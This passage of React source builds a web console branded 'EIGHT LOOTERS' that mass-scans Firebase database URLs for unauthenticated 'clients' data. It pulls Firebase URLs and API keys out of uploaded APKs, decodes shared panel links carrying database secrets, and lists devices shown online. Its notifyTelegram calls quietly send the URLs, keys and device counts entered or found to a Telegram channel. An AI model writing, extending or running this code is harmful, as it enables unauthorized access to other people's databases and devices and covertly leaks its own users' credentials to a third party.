function endOfDay(d){const x=new Date(d);x.setHours(23,59,59,999);return x.getTime();}
function toDateInputValue(ts){if(!ts) return "";const d=new Date(ts);const y=d.getFullYear(),m=String(d.getMonth()+1).padStart(2,"0"),dd=String(d.getDate()).padStart(2,"0");return `${y}-${m}-${dd}`;}
function fromDateInputValue(str){if(!str) return null;const [y,m,d]=str.split("-").map(n=>parseInt(n,10));if(!y||!m||!d) return null;return new Date(y,m-1,d).getTime();}

/* ===== Small UI ===== */
const CopyBtn=React.memo(function CopyBtn({text}){
  const [ok,setOk]=useState(false);
  const cp=()=>{navigator.clipboard.writeText(text);setOk(true);setTimeout(()=>setOk(false),1800);};
  return <button onClick={cp} className="ibtn" style={{padding:7}} title="Copy">
    <span style={{display:"flex",color:ok?"#34d399":"inherit"}}>{ok?Ic.check(13):Ic.copy(13)}</span>
  </button>;
});
const Battery=React.memo(function Battery({percent}){
  const color=percent>=60?"#34d399":percent>=30?"#fbbf24":"#f43f5e";
  return <div style={{display:"flex",alignItems:"center",gap:8}}>
    <div className="bat"><div className="bat-fill" style={{width:`${Math.max(5,percent)}%`,background:color}}/></div>
    <span style={{fontSize:12,fontWeight:700,color,fontVariantNumeric:"tabular-nums"}}>{percent}%</span>
  </div>;
});
function CountUp({value,style}){
  const [v,setV]=useState(value);
  const r=useRef({from:0,raf:null});
  useEffect(()=>{
    if(PERF.isLowEnd){setV(value);return;}
    cancelAnimationFrame(r.current.raf);
    const from=r.current.from,start=performance.now(),dur=600;
    const step=t=>{const p=Math.min(1,(t-start)/dur);const e=1-Math.pow(1-p,3);setV(Math.round(from+(value-from)*e));if(p<1) r.current.raf=requestAnimationFrame(step);else r.current.from=value;};
    r.current.raf=requestAnimationFrame(step);
    return ()=>cancelAnimationFrame(r.current.raf);
  },[value]);
  return <span style={style}>{v}</span>;
}
function Toast({msg}){if(!msg) return null;return <div className="toast">{msg}</div>;}
function StatTile({label,value,color="var(--text)",delay=0}){
  return <div className="a-up" style={{animationDelay:`${delay}s`}}>
    <p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.18em",color:"var(--muted-2)",fontWeight:600,marginBottom:4}}>{label}</p>
    <CountUp value={value} style={{fontSize:20,fontWeight:700,color,lineHeight:1}}/>
  </div>;
}
const Hero=React.memo(function Hero(){
  if(PERF.isLowEnd) return <div className="hero hero-lite"><div className="hero-core">{Ic.zap(26)}</div></div>;
  if(PERF.isMobile) return <div className="hero hero-mobile"><div className="hero-ring"/><div className="hero-core">{Ic.zap(30)}</div></div>;
  return <div className="hero"><div className="hero-ring"/><div className="hero-core">{Ic.zap(30)}</div></div>;
});
function TGButton({label="Join Telegram"}){
  const go=e=>{e.preventDefault();e.stopPropagation();try{window.open(TG_URL,"_blank","noopener,noreferrer");}catch{window.location.href=TG_URL;}};
  return <a href={TG_URL} target="_blank" rel="noopener noreferrer" onClick={go} className="tg-pill">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="#0ea5e9" width="18" height="18"><path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z"/></svg>
    {label}
  </a>;
}

/* ============ WELCOME ============ */
function WelcomeGate({onEnter}){
  const [stage,setStage]=useState(0);const [exiting,setExiting]=useState(false);
  useEffect(()=>{const t1=setTimeout(()=>setStage(1),600);const t2=setTimeout(()=>setStage(2),1400);return ()=>{clearTimeout(t1);clearTimeout(t2);};},[]);
  const enterNow=()=>{try{localStorage.setItem(WELCOME_KEY,"1");}catch{}setExiting(true);setTimeout(()=>onEnter(),500);};
  const joinAndEnter=()=>{try{window.open(TG_URL,"_blank","noopener,noreferrer");}catch{window.location.href=TG_URL;}setTimeout(enterNow,300);};
  const particles=useMemo(()=>{if(PERF.isLowEnd) return [];const n=PERF.isMobile?8:20;return Array.from({length:n}).map(()=>({top:Math.random()*100,left:Math.random()*100,delay:Math.random()*4,dur:3+Math.random()*3,size:2+Math.random()*3}));},[]);
  const titleChars="EIGHT LOOTERS".split("");
  return <div className={"welcome-wrap"+(exiting?" exiting":"")}>
    {!PERF.isLowEnd && particles.length>0 && <div className="welcome-particles">{particles.map((p,i)=><span key={i} className="wp" style={{top:p.top+"%",left:p.left+"%",width:p.size,height:p.size,animationDelay:p.delay+"s",animationDuration:p.dur+"s"}}/>)}</div>}
    <div className="welcome-content">
      <div className={"welcome-logo"+(stage>=1?" in":"")}><div className="wl-ring"/><div className="wl-core">{Ic.zap(36)}</div></div>
      <div className={"welcome-title"+(stage>=1?" in":"")}>{titleChars.map((c,i)=>c===" "?<span key={i} className="wt-space"> </span>:<span key={i} className="wt-char" style={{animationDelay:`${0.03*i}s`}}>{c}</span>)}</div>
      <div className={"welcome-sub"+(stage>=1?" in":"")}><span className="ws-line"/><span className="ws-text">PREMIUM FIREBASE CONSOLE</span><span className="ws-line"/></div>
      <div className={"welcome-cta"+(stage>=2?" in":"")}>
        <button className="wc-btn tg" onClick={joinAndEnter}>
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 240 240" fill="currentColor" width="20" height="20"><path d="M120 0C53.7 0 0 53.7 0 120s53.7 120 120 120 120-53.7 120-120S186.3 0 120 0zm56.1 83.1l-21.3 100.5c-1.6 7.1-5.8 8.9-11.7 5.5l-32.4-24.1-15.7 15.1c-1.7 1.7-3.1 3.1-6.3 3.1l2.3-32.5 59.2-53.5c2.6-2.3-0.6-3.6-4.1-1.3l-72.9 46.1-31.4-9.8c-6.8-2.1-6.9-6.8 1.4-10.1l121.5-46.7c5.6-2.1 10.5 1.3 8.9 9.1z"/></svg>
          <span>JOIN TELEGRAM</span><span className="wc-arrow">{Ic.chev(14)}</span>
        </button>
        <button className="wc-btn skip" onClick={enterNow}>Skip & Enter →</button>
        <p className="wc-note">Join our Telegram channel for updates & support</p>
      </div>
    </div>
  </div>;
}

/* ============ LOGIN SCREEN ============ */
function LoginScreen({onConnect,onMergeAll}){
  const [accounts,setAccounts]=useState([]);
  const [stats,setStats]=useState({});
  const [show,setShow]=useState(false);
  const [url,setUrl]=useState("");const [key,setKey]=useState("");
  const [err,setErr]=useState("");const [busy,setBusy]=useState(false);
  const [bulk,setBulk]=useState("");const [bulkBusy,setBulkBusy]=useState(false);
  const [bulkSum,setBulkSum]=useState(null);const [bulkProgress,setBulkProgress]=useState(null);
  const [fileBusy,setFileBusy]=useState(false);const [fileProgress,setFileProgress]=useState(0);
  const [fileInfo,setFileInfo]=useState("");const [fileName,setFileName]=useState("");const [fileFound,setFileFound]=useState(0);
  const [panels,setPanels]=useState("");const [panelBusy,setPanelBusy]=useState(false);const [panelSum,setPanelSum]=useState(null);
  const [apkFile,setApkFile]=useState("");const [apkBusy,setApkBusy]=useState(false);
  const [apkErr,setApkErr]=useState("");const [apkResult,setApkResult]=useState(null);
  const [copied,setCopied]=useState(false);const [shareLink,setShareLink]=useState("");
  /* Premium states */
  const [showPremium,setShowPremium]=useState(false);
  const [premiumKey,setPremiumKey]=useState("");
  const [premiumErr,setPremiumErr]=useState("");
  const [premiumLoading,setPremiumLoading]=useState(false);
  const fileRef=useRef(null);const bulkFileRef=useRef(null);

  useEffect(()=>{
    const a=loadAccounts();setAccounts(a);
    const tok=new URLSearchParams(window.location.search).get("s");
    if(tok){const d=decodeLink(tok);
      if(d){window.history.replaceState({},"",window.location.pathname);
        if(d.panels?.length){(async()=>{
          const adds=[];const seen=new Set(a.map(x=>`${x.url.replace(/\/$/,"").toLowerCase()}|||${x.key||""}`));
          for(const p of d.panels){const u=String(p.url||"").replace(/\/$/,""),k=String(p.key||""),fp=`${u.toLowerCase()}|||${k}`;
            if(!u||seen.has(fp)) continue;
            try{await fbGet(u,k,"clients");adds.push({id:Date.now()+adds.length,url:u,key:k,date:new Date().toLocaleString()});seen.add(fp);}catch{}}
          if(adds.length){const nx=[...a,...adds];saveAccounts(nx);setAccounts(nx);}
          if(adds.length||a.length) onMergeAll();else setErr("Shared link had no reachable panels.");
        })();}
        else{const found=a.find(x=>x.url===d.url);if(found) tryConnect(found.url,found.key);else addShared(d.url,d.key,a);}
      }
    }
  },[]);

  useEffect(()=>{let dead=false;
    const refresh=async()=>{
      if(!accounts.length){if(!dead) setStats({});return;}
      const n={};
      await Promise.all(accounts.map(async a=>{
        try{const raw=await fbGet(a.url,a.key||"","clients");const rows=parseDevices(raw);
          n[a.id]={online:rows.filter(d=>d.status).length,total:rows.length,ok:true};}
        catch{n[a.id]={online:0,total:0,ok:false};}
      }));
      if(!dead) setStats(n);
    };
    refresh();const t=setInterval(refresh,40000);
    return ()=>{dead=true;clearInterval(t);};},[accounts]);

  const ordered=useMemo(()=>[...accounts].sort((a,b)=>{
    const sa=stats[a.id]?.online??-1,sb=stats[b.id]?.online??-1;if(sb!==sa) return sb-sa;
    const ta=stats[a.id]?.total??-1,tb=stats[b.id]?.total??-1;if(tb!==ta) return tb-ta;
    return a.url.localeCompare(b.url);
  }),[accounts,stats]);

  async function addShared(u,k,list){setBusy(true);setErr("");
    try{await fbGet(u,k,"clients");
      const nx=[...list,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
      saveAccounts(nx);setAccounts(nx);notifyTelegram(tgFirebaseMsg(u,k,"Shared Link"));onConnect(u,k);
    }catch{setErr("Shared connection failed.");}finally{setBusy(false);}}
  async function tryConnect(u,k){setBusy(true);setErr("");
    try{await fbGet(u,k,"clients");onConnect(u,k);}
    catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Permission Denied: Use Database Secret, not API key.");
      else if(m.includes("Network error")) setErr("Network error. Check Firebase URL.");else setErr("Connection failed: "+m.slice(0,120));}
    finally{setBusy(false);}}
  async function submit(){
    const u=url.trim().replace(/\/$/,""),k=key.trim();
    if(!u||!k){setErr("Enter both URL and Key");return;}
    const ex=accounts.find(a=>a.url===u);if(ex){if(confirm("Account exists. Switch?")) await tryConnect(ex.url,ex.key);return;}
    setBusy(true);setErr("");
    try{const test=await fbGet(u,k,"clients");const devCount=test&&typeof test==="object"?Object.keys(test).length:0;
      const nx=[...accounts,{id:Date.now(),url:u,key:k,date:new Date().toLocaleString()}];
      saveAccounts(nx);setAccounts(nx);notifyTelegram(tgFirebaseMsg(u,k,"Manual Add",devCount));onConnect(u,k);
    }catch(e){const m=e.message||String(e);if(m.includes("PERMISSION_DENIED")) setErr("Permission Denied: Use Database Secret, not API key.");
      else setErr("Connection failed: "+m.slice(0,120));}finally{setBusy(false);}
  }
  function del(id,e){e?.stopPropagation();if(!confirm("Delete this account?")) return;const nx=accounts.filter(a=>a.id!==id);saveAccounts(nx);setAccounts(nx);}
  function share(a,e){e?.stopPropagation();setShareLink(makeShareLink(a.url,a.key));}

  /* ═══════════════════════════════════════════════
     PREMIUM ACCESS (GitHub-powered)
     ⚠️ APNA USERNAME AUR REPO YAHAN DAALO ↓
     ═══════════════════════════════════════════════ */
  const PREMIUM_KEY = "ELIGHT1300MEMBER";
  const PREMIUM_GH_USER = "YOUR_GITHUB_USERNAME";   // ← Yahan apna GitHub username likhein
  const PREMIUM_GH_REPO = "YOUR_GITHUB_REPO";       // ← Yahan apna GitHub repo name likhein
  const PREMIUM_GH_BRANCH = "main";                 // ← Agar aapka branch 'master' hai to 'master' kar dein
  const PREMIUM_GH_FILE = "premium_panels.txt";
  const PREMIUM_GH_RAW = `https://raw.githubusercontent.com/${PREMIUM_GH_USER}/${PREMIUM_GH_REPO}/${PREMIUM_GH_BRANCH}/${PREMIUM_GH_FILE}`;

  async function verifyPremium(){
    const k = String(premiumKey||"").trim().toUpperCase();
    setPremiumErr("");
    if(!k){setPremiumErr("Enter access key");return;}
    if(k !== PREMIUM_KEY){setPremiumErr("Invalid access key");return;}
    setPremiumLoading(true);
    try{
      const res = await fetch(PREMIUM_GH_RAW + "?t=" + Date.now(), {cache:"no-store"});
      if(!res.ok) throw new Error("Could not load premium list. Check GitHub URL/Branch.");
      const txt = await res.text();
      const urls = extractFirebaseUrls(txt);
      if(!urls.length) throw new Error("No Firebase URLs found in premium file.");
      const working = [];
      for(const u of urls){
        try{
          const c = await fbGet(u,"","clients");
          if(c !== null){
            const devCount = c && typeof c==="object" ? Object.keys(c).length : 0;
            working.push({url:u, devices:devCount});
          }
        }catch{}
      }
      if(!working.length) throw new Error("No reachable premium panels found.");
      const existing = loadAccounts();
      const existSet = new Set(existing.map(a=>a.url.replace(/\/$/,"").toLowerCase()));
      const adds = [];
      working.forEach(w=>{
        const u = w.url.replace(/\/$/,"");
        if(!existSet.has(u.toLowerCase())){
          adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString(),premium:true});
          existSet.add(u.toLowerCase());
        }
      });
      if(adds.length){const nx=[...existing,...adds];saveAccounts(nx);setAccounts(nx);}
      setShowPremium(false);
      setPremiumKey("");
      notifyTelegram(tgBulkMsg(
        working.map(w=>({url:w.url, ok:true, devices:w.devices})),
        "Premium Access", urls.length
      ));
      setTimeout(()=>onMergeAll(), 300);
    }catch(e){
      setPremiumErr(String(e.message||e).slice(0,120));
    }finally{
      setPremiumLoading(false);
    }
  }

  async function processBulkUrls(urls,source){
    if(!urls.length){setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});return;}
    setBulkBusy(true);setBulkSum(null);setErr("");
    setBulkProgress({total:urls.length,done:0,added:0,failed:0,current:""});
    const exist=new Set(accounts.map(a=>a.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()));
    const success=[],failed=[],skipped=[],adds=[];
    for(let idx=0;idx<urls.length;idx++){
      const u=urls[idx];setBulkProgress(p=>p?{...p,current:u}:p);
      const fp=u.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase();
      if(exist.has(fp)){skipped.push({url:u,reason:"Already saved"});setBulkProgress(p=>p?{...p,done:idx+1}:p);continue;}
      try{const c=await fbGet(u,"","clients");
        if(c===null){failed.push({url:u,reason:"Clients path not found"});}
        else{adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:u,key:"",date:new Date().toLocaleString()});exist.add(fp);
          const devCount=c&&typeof c==="object"?Object.keys(c).length:0;success.push({url:u,devices:devCount});}
      }catch(e){const m=e.message||String(e);failed.push({url:u,reason:m.replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});}
      setBulkProgress(p=>p?{...p,done:idx+1,added:success.length,failed:failed.length}:p);
      await new Promise(r=>setTimeout(r,10));
    }
    if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
    setBulkSum({success,failed,skipped});setBulkBusy(false);
    const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
    if(items.length) notifyTelegram(tgBulkMsg(items,source,urls.length));
    setTimeout(()=>setBulkProgress(null),3500);
    return {success,failed,skipped};
  }
  async function bulkAdd(){
    const urls=extractFirebaseUrls(bulk);
    if(!urls.length){setErr("No valid Firebase URL found. Paste like: http://metabank-3def8-default-rtdb.firebaseio.com");setBulkSum({success:[],failed:[{url:"",reason:"No Firebase URL found"}],skipped:[]});return;}
    await processBulkUrls(urls,"Bulk Paste");setBulk("");
  }
  async function handleBulkFile(file){
    if(!file) return;
    setFileBusy(true);setFileProgress(0);setFileInfo("Reading file…");setFileName(file.name);setFileFound(0);setBulkSum(null);setErr("");
    try{const text=await file.text();const lines=text.split(/\r?\n/);
      const found=[];const seen=new Set();
      setFileInfo(`0 / ${lines.length} lines`);
      for(let i=0;i<lines.length;i++){
        const urls=extractFirebaseUrls(lines[i]);
        for(const u of urls){if(!seen.has(u)){seen.add(u);found.push(u);}}
        const pct=Math.round(((i+1)/lines.length)*100);setFileProgress(pct);
        if(i%10===0||i===lines.length-1){setFileInfo(`Scanning ${i+1} / ${lines.length} · ${found.length} found`);await new Promise(r=>setTimeout(r,4));}
      }
      setFileFound(found.length);setFileInfo(`✓ ${lines.length} lines · ${found.length} URLs`);
      if(!found.length){setErr("No Firebase URL found in file.");return;}
      setFileProgress(100);await new Promise(r=>setTimeout(r,250));
      await processBulkUrls(found,"File Upload");
    }catch(e){setErr("File read failed: "+(e.message||String(e)));}
    finally{setFileBusy(false);setTimeout(()=>{setFileProgress(0);setFileInfo("");setFileName("");setFileFound(0);},4000);}
  }
  async function importPanels(){
    const decode=raw=>{try{const t=String(raw||"").trim();if(!t) return null;
      const m=t.match(/https?:\/\/[^\s<>"']+\?s=([A-Za-z0-9_\-=%]+)/i);if(!m) return null;
      const full=m[0].replace(/[),.;]+$/g,"");const tok=decodeURIComponent(m[1]);
      let p=tok.replace(/-/g,"+").replace(/_/g,"/");while(p.length%4) p+="=";
      const dec=decodeURIComponent(escape(atob(p)));const parts=dec.split("|||");if(!parts[0]) return null;
      return {panelUrl:full,url:parts[0].replace(/\/$/,""),key:parts[1]||""};}catch{return null;}};
    const links=[...new Set(panels.split(/\s+/).map(x=>x.trim()).filter(Boolean))];
    const parsed=[],seen=new Set();
    for(const r of links){const it=decode(r);if(!it) continue;const fp=`${it.url}|||${it.key}`.toLowerCase();if(seen.has(fp)) continue;seen.add(fp);parsed.push(it);}
    if(!parsed.length){setPanelSum({success:[],failed:[{url:"",reason:"No valid ?s= links"}],skipped:[]});return;}
    setPanelBusy(true);setPanelSum(null);setErr("");
    const exist=new Set(accounts.map(a=>`${a.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()}|||${a.key||""}`));
    const success=[],failed=[],skipped=[],adds=[];
    for(const it of parsed){
      const fp=`${it.url.replace(/^https?:\/\//i,"").replace(/\/$/,"").toLowerCase()}|||${it.key||""}`;
      if(exist.has(fp)){skipped.push({url:it.url,reason:"Already saved"});continue;}
      try{const c=await fbGet(it.url,it.key,"clients");if(c===null) throw new Error("Clients path not found");
        adds.push({id:Date.now()+adds.length+Math.floor(Math.random()*9999),url:it.url,key:it.key,date:new Date().toLocaleString()});exist.add(fp);
        const devCount=c&&typeof c==="object"?Object.keys(c).length:0;success.push({url:it.url,devices:devCount});
      }catch(e){failed.push({url:it.url,reason:(e.message||String(e)).replace(/^PERMISSION_DENIED:\s*/i,"Permission denied — ")});}
    }
    if(adds.length){const nx=[...accounts,...adds];saveAccounts(nx);setAccounts(nx);}
    setPanels("");setPanelSum({success,failed,skipped});setPanelBusy(false);
    const items=[...success.map(s=>({url:s.url,ok:true,devices:s.devices})),...failed.map(f=>({url:f.url,ok:false,reason:f.reason}))];
    if(items.length) notifyTelegram(tgBulkMsg(items,"Panel Link Import",parsed.length));
  }
  async function onApk(f){
    if(!f) return;
    if(!f.name.endsWith(".apk")&&!f.name.endsWith(".zip")){setApkErr("Only .apk / .zip supported");return;}
    setApkBusy(true);setApkErr("");setApkResult(null);setApkFile(f.name);
    try{const r=await parseApk(f);
      if(!r||(!r.firebaseUrl&&!r.apiKey)){setApkErr("Firebase config not found in this file");return;}
      setApkResult(r);if(r.firebaseUrl) setUrl(r.firebaseUrl);if(r.apiKey) setKey(r.apiKey);
      if(r.firebaseUrl) notifyTelegram(tgApkMsg(f.name,r.firebaseUrl,r.apiKey,r.projectId));
    }catch(e){setApkErr("Failed to parse file: "+(e.message||String(e)));}
    finally{setApkBusy(false);}
  }
  const resetApk=()=>{setApkResult(null);setApkErr("");setApkFile("");};

  return <div className="app a-in" style={{minHeight:"100vh",display:"flex",alignItems:"center",justifyContent:"center",padding:"32px 16px"}}>
    <div style={{width:"100%",maxWidth:490}}>
      <div style={{textAlign:"center",marginBottom:18}}>
        <Hero/>
        <div className="a-up d2" style={{display:"flex",flexDirection:"column",alignItems:"center",gap:12,marginTop:8}}>
          <h1 className="hero-title-neon">{"EIGHT LOOTERS".split("").map((c,i)=>c===" "?<span key={i} className="htn-space"> </span>:<span key={i} className="htn-char">{c}</span>)}</h1>
          <div className="htn-pill">FIREBASE CONSOLE</div>
        </div>
        <p className="a-up d3" style={{fontSize:13,color:"var(--muted)",marginTop:10}}>Sleek device management · Real-time sync</p>
        <div className="a-up d4" style={{marginTop:14,display:"flex",justifyContent:"center"}}><TGButton label="Join Telegram"/></div>
      </div>

      <div className="glass a-up d5" style={{borderRadius:26,padding:28}}>
        {!show && <>
          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:16}}>
            <div style={{display:"flex",alignItems:"center",gap:8}}>{Ic.wifi(15)}<span style={{fontSize:13,fontWeight:600}}>Saved Accounts</span></div>
            <span className="badge" style={{background:"rgba(139,92,246,.1)",borderColor:"rgba(139,92,246,.3)",color:"#c4b5fd"}}>{accounts.length} {accounts.length===1?"account":"accounts"}</span>
          </div>
          <div style={{maxHeight:220,overflowY:"auto",marginBottom:14}}>
            {accounts.length===0
              ?<div className="a-in" style={{textAlign:"center",padding:"32px 0",color:"var(--muted)"}}>
                <div style={{display:"inline-flex",opacity:.35,marginBottom:8}}>{Ic.wifi(30)}</div>
                <p style={{fontSize:13}}>No saved accounts</p>
              </div>
              :ordered.map((a,i)=>(
                <div key={a.id} onClick={()=>!busy&&tryConnect(a.url,a.key)} className="a-right lift"
                  style={{animationDelay:`${Math.min(i*0.03,0.4)}s`,display:"flex",alignItems:"center",gap:12,padding:12,borderRadius:14,border:"1px solid var(--border)",background:"rgba(14,12,28,.4)",marginBottom:8,cursor:"pointer"}}>
                  <div style={{flex:1,minWidth:0}}>
                    <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
                      <p className="mono" style={{fontSize:12,fontWeight:600,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{a.url}</p>
                      <span className="badge" style={{background:stats[a.id]?.ok?"rgba(52,211,153,.1)":"rgba(139,92,246,.06)",borderColor:stats[a.id]?.ok?"rgba(52,211,153,.3)":"rgba(139,92,246,.2)",color:stats[a.id]?.ok?"#34d399":"var(--muted-2)",fontSize:9}}>
                        {stats[a.id]?.ok?`${stats[a.id].online} online`:"checking…"}
                      </span>
                      {a.premium && <span className="badge" style={{background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.35)",color:"#fbbf24",fontSize:9}}>👑</span>}
                    </div>
                    <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:3}}>{a.date} · {stats[a.id]?.ok?`${stats[a.id].total} total`:"—"}</p>
                  </div>
                  <div style={{display:"flex",gap:6}}>
                    <button onClick={e=>share(a,e)} className="ibtn" style={{padding:7,color:"#a5f3fc",background:"rgba(34,211,238,.1)",borderColor:"rgba(34,211,238,.3)"}}>{Ic.share(12)}</button>
                    <button onClick={e=>del(a.id,e)} className="ibtn" style={{padding:7,color:"#fb7185",background:"rgba(244,63,94,.1)",borderColor:"rgba(244,63,94,.3)"}}>{Ic.trash(12)}</button>
                    <span style={{display:"flex",alignItems:"center",color:"var(--muted-2)"}}>{Ic.chev(14)}</span>
                  </div>
                </div>
              ))}
          </div>
          <div style={{display:"flex",flexDirection:"column",gap:10}}>
            <button onClick={()=>{setShow(true);setErr("");resetApk();}} className="btn btn-ghost" style={{width:"100%"}}>{Ic.plus(15)} New Account</button>
            <button onClick={onMergeAll} disabled={!accounts.length} className="btn btn-cyan" style={{width:"100%"}}>
              <span>Merge All & Show</span>
              <span style={{fontSize:10,padding:"2px 7px",borderRadius:999,background:"rgba(34,211,238,.15)",border:"1px solid rgba(34,211,238,.3)"}}>{accounts.length}</span>
            </button>
            <button onClick={()=>{setShowPremium(true);setPremiumErr("");setPremiumKey("");}}
              className="btn" style={{width:"100%",background:"linear-gradient(135deg,#fbbf24,#f97316)",color:"#fff",border:"1px solid rgba(251,191,36,.6)",boxShadow:"0 8px 24px rgba(251,191,36,.35)",fontWeight:800,letterSpacing:"0.05em"}}>
              <span>👑 PREMIUM ACCESS</span>
            </button>
            <div className="glass-2" style={{borderRadius:14,padding:12,marginTop:4}}>
              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:8,gap:8,flexWrap:"wrap"}}>
                <p style={{fontSize:11,fontWeight:600,color:"var(--muted)"}}>Bulk Add Firebase URLs</p>
                <label htmlFor="bulk-file" style={{cursor:"pointer",display:"inline-flex",alignItems:"center",gap:5,padding:"5px 10px",borderRadius:8,background:"rgba(34,211,238,.08)",border:"1px solid rgba(34,211,238,.3)",color:"#a5f3fc",fontSize:10,fontWeight:600}}>{Ic.upload(12)} Upload File</label>
                <input ref={bulkFileRef} id="bulk-file" type="file" onChange={e=>{const f=e.target.files[0];e.target.value="";handleBulkFile(f);}} style={{display:"none"}}/>
              </div>
              <textarea rows={5} value={bulk} onChange={e=>setBulk(e.target.value)} className="inp" placeholder={"Paste any format:\nhttp://metabank-3def8-default-rtdb.firebaseio.com\nhttps://myapp.firebaseio.com\nmyapp-default-rtdb.firebaseio.com"} style={{fontSize:11}}/>
              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:10,marginTop:8,flexWrap:"wrap"}}>
                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Any format · file upload supported</span>
                <button onClick={bulkAdd} disabled={bulkBusy||fileBusy||!bulk.trim()} className="btn btn-purple" style={{padding:"8px 14px",fontSize:11}}>
                  {bulkBusy?<><span className="spin sm"/>Adding…</>:"Add All"}
                </button>
              </div>
              {fileBusy && <div className="a-up pro-prog" style={{marginTop:10}}>
                <div className="pro-prog-head"><span className="pro-prog-title">{Ic.upload(12)} <span className="mono" style={{color:"#a5f3fc",overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap",maxWidth:170}}>{fileName}</span></span><span className="pro-prog-pct">{fileProgress}%</span></div>
                <div className="pro-prog-track"><div className="pro-prog-fill cyan" style={{width:`${fileProgress}%`}}/></div>
                <p className="mono pro-prog-sub">{fileInfo}</p>
              </div>}
              {!fileBusy && fileFound>0 && <div className="a-in" style={{marginTop:8,fontSize:10,color:"#34d399",display:"flex",alignItems:"center",gap:5}}>{Ic.check(11)} {fileInfo}</div>}
              {bulkProgress && <div className="a-up pro-prog" style={{marginTop:10,borderColor:"rgba(139,92,246,.35)"}}>
                <div className="pro-prog-head"><span className="pro-prog-title"><span className="pro-prog-dot"/>Adding <b>{bulkProgress.done}</b> / <b>{bulkProgress.total}</b></span><span className="pro-prog-pct purple">{Math.round((bulkProgress.done/bulkProgress.total)*100)}%</span></div>
                <div className="pro-prog-track"><div className="pro-prog-fill violet" style={{width:`${(bulkProgress.done/bulkProgress.total)*100}%`}}/></div>
                <div className="pro-prog-stats">
                  <span className="stat-ok">{Ic.check(10)} {bulkProgress.added} activated</span>
                  <span className="stat-bad">{Ic.x(10)} {bulkProgress.failed} failed</span>
                  <span className="stat-rem">{bulkProgress.total - bulkProgress.done} left</span>
                </div>
                {bulkProgress.current && <p className="mono pro-prog-sub" style={{marginTop:6}}>→ {bulkProgress.current.replace(/^https?:\/\//,"").slice(0,60)}</p>}
              </div>}
            </div>
            <div className="glass-2" style={{borderRadius:14,padding:12}}>
              <p style={{fontSize:11,fontWeight:600,color:"var(--muted)",marginBottom:8}}>Import Panel Links</p>
              <textarea rows={4} value={panels} onChange={e=>setPanels(e.target.value)} className="inp" placeholder="Paste panel links containing ?s=… one per line" style={{fontSize:11}}/>
              <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",gap:10,marginTop:8}}>
                <span style={{fontSize:9,color:"var(--muted-2)",lineHeight:1.4}}>Decodes s=, tests, saves working.</span>
                <button onClick={importPanels} disabled={panelBusy||!panels.trim()} className="btn btn-purple" style={{padding:"8px 14px",fontSize:11}}>
                  {panelBusy?<><span className="spin sm"/>Importing…</>:"Import Links"}
                </button>
              </div>
            </div>
          </div>
          {(bulkSum||panelSum) && <div style={{marginTop:14,display:"flex",flexDirection:"column",gap:12}}>
            {[["Bulk Add Summary",bulkSum,()=>setBulkSum(null)],["Panel Import Summary",panelSum,()=>setPanelSum(null)]].map(([title,sum,clr])=>sum&&(
              <div key={title} className="glass-2 a-up" style={{borderRadius:14,overflow:"hidden"}}>
                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"10px 14px",borderBottom:"1px solid var(--border)"}}>
                  <p style={{fontSize:11,fontWeight:700}}>{title}</p><button onClick={clr} style={{fontSize:10,color:"var(--muted-2)"}}>Clear</button>
                </div>
                <div style={{display:"grid",gridTemplateColumns:"1fr 1fr 1fr",gap:8,padding:12}}>
                  <div style={{padding:8,borderRadius:10,background:"rgba(52,211,153,.08)",border:"1px solid rgba(52,211,153,.25)"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"#34d399",opacity:.8}}>Added</p><p style={{fontSize:18,fontWeight:700,color:"#34d399"}}><CountUp value={sum.success.length}/></p></div>
                  <div style={{padding:8,borderRadius:10,background:"rgba(244,63,94,.08)",border:"1px solid rgba(244,63,94,.25)"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"#fb7185",opacity:.8}}>Failed</p><p style={{fontSize:18,fontWeight:700,color:"#fb7185"}}><CountUp value={sum.failed.length}/></p></div>
                  <div style={{padding:8,borderRadius:10,background:"rgba(139,92,246,.06)",border:"1px solid var(--border)"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.1em",color:"var(--muted-2)"}}>Skipped</p><p style={{fontSize:18,fontWeight:700,color:"var(--muted)"}}><CountUp value={sum.skipped.length}/></p></div>
                </div>
